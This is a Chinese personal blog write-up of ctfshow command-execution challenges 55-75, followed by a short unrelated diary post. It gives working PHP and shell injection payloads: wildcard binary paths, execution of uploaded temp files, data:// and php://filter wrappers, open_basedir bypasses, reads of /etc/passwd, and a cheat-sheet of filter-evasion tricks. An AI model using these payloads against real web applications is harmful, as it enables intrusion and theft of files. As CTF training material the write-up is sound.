<p>这题目真骚，payload更骚</p>
<p>?c=/???/???64%20???.???</p>
<table>
<thead>
<tr>
<th>**bin目录:**bin为binary的简写主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等</th>
</tr>
</thead>
</table>
<p>这里我们可以利用 base64 中的64 进行通配符匹配 即 /bin/base64 flag.php</p>
<p>羽大佬的WP还有一种解法</p>
<p>如下：payload：?c=/???/???/???2 ???.??? 然后在url + /flag.php.bz2</p>
<table>
<thead>
<tr>
<th>/usr/bin目录:主要放置一些应用软件工具的必备执行档例如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome*、 zip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb*、wget等。</th>
</tr>
</thead>
</table>
<p>我们可以利用/usr/bin下的<strong>bzip2</strong></p>
<p>意思就是说我们先将flag.php文件进行压缩，然后再将其下载</p>
<p>ctfshow{1a3616a8-6ae4-4951-a6b3-5f0631c6279c}</p>
<h1>web56</h1>
<p>新知识，无post上传文件，我们可以创建窗口上传文件来运行脚本拿到flag</p>
<p>造一个post上传文件的数据包</p>
<p>在桌面创建post.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST文件上传<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://08f987d7-d95f-4f18-a2ab-5d9915f7349f.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>再创建文件1.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">ls</span><br></pre></td></tr></table></figure>
<p>shell程序必须以&quot;#!/bin/sh&quot;开始，#! /bin/sh 是指此脚本使用/bin/sh来解释执行，#!是特殊的表示符，其后面跟的是解释此脚本的shell的路径</p>
<p>打开post.html（注意里面的链接改为题目的链接）</p>
<p>上传1.php</p>
<p>用bp抓包</p>
<p>严格按照图片的格式，好像是不等多一行，空白也不行。</p>
<p>然后发送多次，就可以了</p>
<p>之后改成cat flag.php就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=.%20/???/????????[@-[</span><br></pre></td></tr></table></figure>
<p>1.php就是我们上传的可控的文件，我们传的参数c的值为 . /bin/phpXXXXXX，意思就是说匹配上传1.php文件所生成的临时文件，并执行之</p>
<p><img src="image-20250121181036702.png" alt="image-20250121181036702"></p>
<p>ctfshow{a3f7bc05-69a7-40af-9510-22fa6996596</p>
<h1>web57</h1>
<p>flag在36.php，并且在sys里面已经把命令和后缀给我们了，直接搞出来36就行了</p>
<p><img src="image-20250121194051599.png" alt="image-20250121194051599"></p>
<p><em><strong>算术扩展（Arithmetic Expansion）运算</strong></em></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输出 5</span></span><br><span class="line"><span class="built_in">echo</span> $((<span class="number">2</span> + <span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出 10 乘以 2 的结果</span></span><br><span class="line"><span class="built_in">echo</span> $((<span class="number">10</span> * <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出 10 除以 2 的结果</span></span><br><span class="line"><span class="built_in">echo</span> $((<span class="number">10</span> / <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出 10 对 3 取模的结果</span></span><br><span class="line"><span class="built_in">echo</span> $((<span class="number">10</span> % <span class="number">3</span>))</span><br></pre></td></tr></table></figure>
<p>~代表取反</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 以下是更详细的代码示例，对0取反，就是对0的二进制，0进行取反，取反后为-1</span></span><br><span class="line">00000000 00000000 00000000 00000000(假设为32位整数)</span><br><span class="line">取反</span><br><span class="line">11111111 11111111 11111111 11111111</span><br><span class="line"><span class="built_in">echo</span> $((~<span class="number">0</span>))</span><br><span class="line"><span class="comment"># 输出为 -1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 另一个示例，将 5 进行按位取反</span></span><br><span class="line"><span class="built_in">echo</span> $((~<span class="number">5</span>))</span><br><span class="line"><span class="comment"># 先将 5 表示为二进制：00000000 00000000 00000000 00000101</span></span><br><span class="line"><span class="comment"># 取反后：11111111 11111111 11111111 11111010</span></span><br><span class="line"><span class="comment"># 这是 -6 的补码表示，因此输出为 -6</span></span><br></pre></td></tr></table></figure>
<p>算出36</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> $(())</span><br><span class="line"><span class="built_in">echo</span> ---------</span><br><span class="line"><span class="built_in">echo</span> $((~$(())))</span><br><span class="line"><span class="built_in">echo</span> ---------</span><br><span class="line"><span class="built_in">echo</span> $((~$(())+$((~$(())))))</span><br><span class="line"><span class="built_in">echo</span> ---------</span><br><span class="line"><span class="built_in">echo</span> $((~$(())+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))))</span><br><span class="line"><span class="built_in">echo</span> ---------</span><br><span class="line"><span class="built_in">echo</span> $((~$(($((~$(())+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))))))))</span><br><span class="line"><span class="built_in">echo</span> ---------</span><br><span class="line"><span class="built_in">echo</span> $((~$(($((~$(())+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))))))))</span><br><span class="line"></span><br><span class="line">输出后是:</span><br><span class="line">0</span><br><span class="line">---------1</span><br><span class="line">-1</span><br><span class="line">---------2</span><br><span class="line">-2</span><br><span class="line">---------3</span><br><span class="line">-36</span><br><span class="line">---------4</span><br><span class="line">35</span><br><span class="line">---------5</span><br><span class="line">36</span><br></pre></td></tr></table></figure>
<p>那么</p>
<p>?c=$((~$(($((~$(())+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))))))))</p>
<p>如果过滤了加号+</p>
<p>?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</p>
<p>ctfshow{3c196564-646f-4120-ae93-1d9f372db21d}</p>
<h1>web58-65</h1>
<p>存在禁用函数，需要各种函数都试试</p>
<p>post</p>
<p>1.c=echo highlight_file(‘flag.php’);<br>
2.c=show_source(“flag.php”);<br>
3.c=highlight_file(“flag.php”);这个应该算是通杀啊，因为在源码就是通过这个函数来显示的，就在else里面highlight_file</p>
<p>4.c=echo file_get_contents(‘flag.php’);</p>
<p>5.c=include(‘flag.php’);echo $flag;</p>
<p>为什么$flag?这是一个变量，相当于我们在java当中int flag = 123456789，然后通过system.out.print(a);打印出来a，也就是123456789这几个赋值给a的数字</p>
<p>之前拿flag不是会进去源码看吗？</p>
<p>里面会有这样的一行代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;ctfshow&#123;a24e6a78-ca48-41ea-8099-904edab2b001&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>6.文件包含相当于咱们学的Java引入一个数据库，然后通过查看什么东西就可以拿到咱们引入的文件的内容</p>
<p>那么我们c=include(‘falg.php’);var_dump(get_defined_vars());</p>
<p>var_dump(get_defined_vars());是拿到所有的注册变量，然后通过var_dump()输出所有变量</p>
<p>7.post里面用一个文件包含，传上去一个a</p>
<p>在url后面加一个?a=php://filter/convert.base64-encode/resource=flag.php</p>
<p><img src="image-20250121202846868.png" alt="image-20250121202846868"></p>
<p>ctfshow{6392df6a-91bd-4704-9398-b7cd00e15aaf}</p>
<p>8.c=rename(‘flag.php’,‘1.txt’)然后进入1.txt查看</p>
<p>9.c=show_source(next(array_reverse(scandir(‘.’))));</p>
<h1>web66</h1>
<p>这题终于不一样了(其实就是flag换地方了)，我们用上述方法找不到flag</p>
<p>我们先扫描目录</p>
<p>c=print_r(scadir(‘/’));</p>
<p>发现flag.txt</p>
<p>c=highlight_file(‘/flag.txt’);</p>
<p>进去</p>
<h1>web67</h1>
<p>这道题用正常思路，不猜flag在那个文件</p>
<p>先扫描目录，发现我们之前用的print_r()函数被禁掉了，用var_dump()函数来代替</p>
<table>
<thead>
<tr>
<th>print_r()输出[name] =&gt; John</th>
</tr>
</thead>
<tbody>
<tr>
<td>var_dump()输出[“name”]=&gt;     string(4) “John”。</td>
</tr>
<tr>
<td><code>var_dump()</code> 更侧重于变量的详细信息，而 <code>print_r()</code> 更侧重于变量的结构和易读性。就如把name的类型打印出来（String类型，4个字符）</td>
</tr>
</tbody>
</table>
<p>c=highlight_file(‘/flag.txt’);</p>
<p>ctfshow{32ceca18-433a-441a-90c3-d9038047ef44}</p>
<h1>web68</h1>
<p>这道题通杀答案highlight_file()被噶了</p>
<p>通过扫描目录，还是在txt里面，应该是变量输出啊应该，要不然以现有知识应该搞不出来</p>
<p>c=include(‘/flag.txt’);这里不用echo，否则flag下面会出现一行报错（不影响我们拿flag）</p>
<p>为什么不用echo？</p>
<p>因为flag.txt里面没有php标签**<code>&lt;?php...?&gt;</code>**，然后我们通过html打开了他，他默认会输出内容</p>
<p>ctfshow{882c2f13-b515-413e-8857-67c1005072f4}</p>
<h1>web69</h1>
<p>这一题var_dump()也被禁掉了，用var_export()代替</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;name&#x27; =&gt; &#x27;John&#x27;</span><br></pre></td></tr></table></figure>
<p>与var_dump的区别就是数组的话用建值来显示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0 =&gt; &#x27;reading&#x27;,</span><br></pre></td></tr></table></figure>
<p>c=include(‘/flag.txt’);</p>
<p>ctfshow{2e64a68d-2b05-46ba-9bb6-0df1ea8145b6}</p>
<p>web70</p>
<p>同web69</p>
<p>但是这道题进去的页面提醒我了error_reporting()、ini_set()是不是也可以拿到flag？</p>
<p>然后再插进去一个知识scandir()如果被禁用了，用glob()代替</p>
<p>ctfshow{5b059330-5c9e-43f5-86ce-d8e59c3ee207}</p>
<p>web71</p>
<p>c=var_export(scandir(‘/’));扫描出来个emmm</p>
<p><img src="image-20250121220335830.png" alt="image-20250121220335830"></p>
<p>六百六十六，演都不演了</p>
<p>对了，还给有附件了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: Lazzaro</span><br><span class="line"># @Date:   2020-09-05 20:49:30</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-07 22:02:47</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;display_errors&#x27;, 0);</span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure>
<p>ob_get_contents()：得到缓冲区的内容（数据）。<br>
ob_end_clean()：会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容。<br>
preg_replace(“/[0-9]|[a-z]/i”,“?”,$s)：把存放缓冲区内容的变量$s的内容都替换为问号。用之前payload发现输出的一大堆问号，就是因为这句话。</p>
<p>方法一：wp:其人之道还之其人之身</p>
<p>c=include(“/flag.txt”);$ss=ob_get_contents();ob_end_clean();echo $ss;</p>
<p>方法二：当执行完eval()之后就结束代码进程</p>
<p>c=include(‘/flag.txt’);exit();</p>
<p>c=include(‘/flag.txt’);die();</p>
<p>ctfshow{d7a57ee7-b124-4ca2-b99d-2fa14ac563d1}</p>
<h1>web72</h1>
<p>源码不变</p>
<p>web71的方法不行了</p>
<p>我们var_export(scandir(‘/’));die();读取不了目录</p>
<p>open_basedir()函数限制了php能够操作的目录，在后面说明了限制在的操作的目录/var/www/html/</p>
<p>这时我们可以用到glob()函数，此函数属于伪协议的一种。</p>
<p>glob伪协议在筛选目录时不受open_basedir制约</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);</span><br><span class="line">	# 利用DirectoryIterator($path)可以实现遍历目录下的所有文件</span><br><span class="line">	# glob:// — 查找匹配的文件路径模式</span><br><span class="line">	# DirectoryIterator(&quot;glob:///*&quot;)   遍历根目录里所有文件</span><br><span class="line">foreach($a as $f)</span><br><span class="line">&#123;echo($f-&gt;__toString().&#x27; &#x27;);</span><br><span class="line">&#125;exit(0);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>不管了，这道题还需要分析大佬的脚本，贼jb长，老婆娘的裹脚布，又臭又长</p>
<p>web73</p>
<p>正常走流程</p>
<p>知识文件名变了</p>
<p>ctfshow{6020494c-3f4c-42d3-9c23-0b540119fb20}</p>
<p>web74</p>
<p>scandir()被禁用了</p>
<p>c=var_export(glob(‘/*’));die();</p>
<p>c=include(‘/flagx.txt’);die();</p>
<p>web75</p>
<p>利用<code>mysql</code>的<code>load_file</code>读文件，绕过<code>open_basedir</code> 限制。（只限制了PHP的访问目录，不关MYSQL的事情）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=</span><br><span class="line">try &#123;</span><br><span class="line">    $dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,</span><br><span class="line">        &#x27;root&#x27;);</span><br><span class="line"> </span><br><span class="line">    foreach ($dbh-&gt;query(&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;) as $row) &#123;</span><br><span class="line">        echo ($row[0]) . &quot;|&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $dbh = null;</span><br><span class="line">&#125; catch (PDOException $e) &#123;</span><br><span class="line">    echo $e-&gt;getMessage();</span><br><span class="line">    exit(0);</span><br><span class="line">&#125;</span><br><span class="line">exit(0);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>不写了，后面的都太麻烦了，集中一下关键词了</p>
<p>fuzz、</p>
<p>c了，为什么这么不爽，后面这么难，</p>
<h1>总结</h1>
<p>1.<strong>空格绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%09 符号需要php环境</span><br><span class="line"></span><br><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line"></span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line"></span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line"></span><br><span class="line">cat&lt;flag.txt</span><br><span class="line"></span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line"></span><br><span class="line">kg=$&#x27;\x20flag.txt&#x27;&amp;&amp;cat$kg</span><br><span class="line"></span><br><span class="line">(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</span><br></pre></td></tr></table></figure>
<p>2.<strong>cat过滤</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line"></span><br><span class="line">less:与 more 类似。但在用 more 时候可能不能向上翻页，不能向上搜索指定字符串，而 less 却可以自由的向上向下翻页，也可以自由的向上向下搜索指定字符串。</span><br><span class="line"></span><br><span class="line">head:查看头几行</span><br><span class="line"></span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line"></span><br><span class="line">tail:查看尾几行</span><br><span class="line"></span><br><span class="line">nl：命令的作用和 cat -n 类似，是将文件内容全部显示在屏幕上，并且是从第一行开始显示，同时会自动打印出行号。</span><br><span class="line"></span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line"></span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line"></span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line"></span><br><span class="line">sort:可以查看</span><br><span class="line"></span><br><span class="line">uniq:可以查看</span><br><span class="line"></span><br><span class="line">file -f:报错出具体内容。可以利用报错将文件内容带出来（-f&lt;名称文件&gt; 　指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称。）</span><br></pre></td></tr></table></figure>
<p>3.<strong>php无需括号的函数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo 123;</span><br><span class="line"></span><br><span class="line">print 123;</span><br><span class="line"></span><br><span class="line">die;</span><br><span class="line"></span><br><span class="line">include &quot;/etc/passwd&quot;;</span><br><span class="line"></span><br><span class="line">例如?c=include&quot;$_GET[url]&quot;?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br><span class="line">或者?c=include%0a$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br><span class="line">require &quot;/etc/passwd&quot;;</span><br><span class="line"></span><br><span class="line">include_once &quot;/etc/passwd&quot;;</span><br><span class="line"></span><br><span class="line">require_once &quot;etc/passwd&quot;;</span><br></pre></td></tr></table></figure>
<p>4.?&gt;符号相当于和前面的&lt;?php对应了，然后后面的代码会在空间外执行</p>
<ol start="5">
<li></li>
</ol>
<table>
<thead>
<tr>
<th>?c=require$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</th>
</tr>
</thead>
<tbody>
<tr>
<td>和</td>
</tr>
<tr>
<td><strong>?c=require&quot;$_GET[a]&quot;?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</strong></td>
</tr>
<tr>
<td>的区别是：有引号，优先执行</td>
</tr>
</tbody>
</table>
<p>6.文件包含时，如果题目源码当中又出现了一个包含函数(web37)，那么我们可以用data</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php system(<span class="string">&#x27;cat fla*&#x27;</span>);?&gt;</span><br></pre></td></tr></table></figure>
<p>文件包含相当于咱们学的Java引入一个数据库，然后通过查看什么东西就可以拿到咱们引入的文件的内容</p>
<p>7.如6.当中的代码，如果题目过滤了php，我们可以将&lt;?php换成&lt;?=</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?= system(<span class="string">&#x27;cat fla*&#x27;</span>);?&gt;</span><br></pre></td></tr></table></figure>
<p>或者我们将后面的进行base64编码，不能用cat</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJubCBmbGFnLnBocCAiKTs/Pg==          <span class="comment"># &lt;?php system(&quot;nl flag.php &quot;);?&gt;</span></span><br></pre></td></tr></table></figure>
<ol start="9">
<li></li>
</ol>
<table>
<thead>
<tr>
<th>localeconv() 函数会返回一个包含本地环境信息的数组</th>
</tr>
</thead>
<tbody>
<tr>
<td>**pos()**和 **current()**是等价的函数，它们会返回数组的当前元素。对于 localeconv()函数返回的数组，使用 pos(localeconv()) 通常会返回该数组的第一个元素的值，如果这个元素是点则返回点，如果是flag则返回flag这四个字符</td>
</tr>
<tr>
<td>**scandir()**函数用于扫描指定目录的文件和目录，由于 pos(localeconv()) 可能返回点，所以 scandir(pos(localeconv())) 等价于scandir(“.”)。</td>
</tr>
<tr>
<td>scandir(“.”)会返回一个包含当前目录下所有文件和目录名称的数组</td>
</tr>
<tr>
<td>**array_reverse()**函数将数组中的元素顺序反转。例如，对于 array(‘.’, ‘…’, ‘index.php’, ‘config.php’, ‘images’)，会变成 array(‘images’, ‘config.php’, ‘index.php’, ‘…’, ‘.’)。</td>
</tr>
<tr>
<td><strong>next(</strong>)函数将数组的内部指针向前移动一个位置，并返回新位置的元素。</td>
</tr>
<tr>
<td>对于 array_reverse(scandir(pos(localeconv()))) 结果，它会跳过第一个元素（例如 images），返回下一个元素（例如 config.php）。</td>
</tr>
<tr>
<td><strong>show_source()</strong> 函数用于显示指定 PHP 文件的源代码，会高亮显示文件内容。</td>
</tr>
</tbody>
</table>
<ol start="10">
<li></li>
</ol>
<p>12.<strong>&gt;/dev/null 2&gt;&amp;1</strong>可以将/dev/null看作&quot;黑洞&quot;. 它非常等价于一个只写文件. 所有写入它的内容都会永远丢失. 而尝试从它那儿读取内容则什么也读不到. 然而, /dev/null对命令行和脚本都非常的有用.</p>
<p>13.命令分割</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;	//分号</span><br><span class="line">|	//只执行后面那条命令</span><br><span class="line">||	//只执行前面那条命令</span><br><span class="line">&amp;	//两条命令都会执行</span><br><span class="line">&amp;&amp;	//两条命令都会执行</span><br></pre></td></tr></table></figure>
<p>14.<strong>空格过滤指过滤了“ ”和“%20”</strong></p>
<p>15.<strong>过滤了数字，但是%09不属于数字</strong>.<code>%09</code> 表示水平制表符（Tab）的编码形式。相当于空格</p>
<p>16.**&lt;&gt;**与html编程有关，这个好像可以弄出来一个空格</p>
<p>17.<strong>反斜杠</strong>\是转义字符。在 <code>fla\g.php</code> 中，可能是试图将 <code>g</code> 转义，使得 <code>fla\g.php</code> 不会被当作一个整体，而被解释为 <code>fla</code> 和 <code>g.php</code>，如果cat被过滤，ca\t可以绕过。</p>
<p>18.**‘’**两个双引号同\一样</p>
<p>19.<strong>grep test *file</strong>在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=grep &#x27;&#x27;&#123;&#x27; flag.php</span><br></pre></td></tr></table></figure>
<p>意思就是在 flag.php匹配到的文件中，查找含有{的文件，并打印出包含 { 的这一行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=grep &#x27;&#x27;ctfshow flag.php</span><br></pre></td></tr></table></figure>
<p>意思就是在 flag.php匹配到的文件中，查找含有{的文件，并打印出包含 ctfshow的这一行</p>
<ol start="20">
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=mv fla?.php b.txt</span><br></pre></td></tr></table></figure>
<p>将flag.php移动到b.txt</p>
<p>使用mv时，flag.php将会被删除</p>
<p>21.**bin目录:**bin为binary的简写主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等.web55</p>
<p>22.<strong>/usr/bin目录</strong>:主要放置一些应用软件工具的必备执行档例如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome*、 zip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb*、wget等。web55</p>
<p>23.<strong>造一个post上传文件的数据包</strong>web56</p>
<p>24.<strong>算术扩展（Arithmetic Expansion）运算</strong>web57</p>
<p>25.<strong>php标签</strong><code>&lt;?php...?&gt;</code></p>
<p>26.<strong>结束代码进程</strong>exit();die();</p>
]]></content>
      <tags>
        <tag>ctfshow_web_命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>搞砸了</title>
    <url>/2024/12/12/%E6%90%9E%E7%A0%B8%E4%BA%86/</url>
    <content><![CDATA[<p>听三百遍反方向的钟，让我回去吧。 给23.12.17下午那个傻孩子一巴掌，全搞砸了</p>
<p><img src="image-20250122014041713.png" alt="image-20250122014041713"></p>
]]></content>
  </entry>
</search>
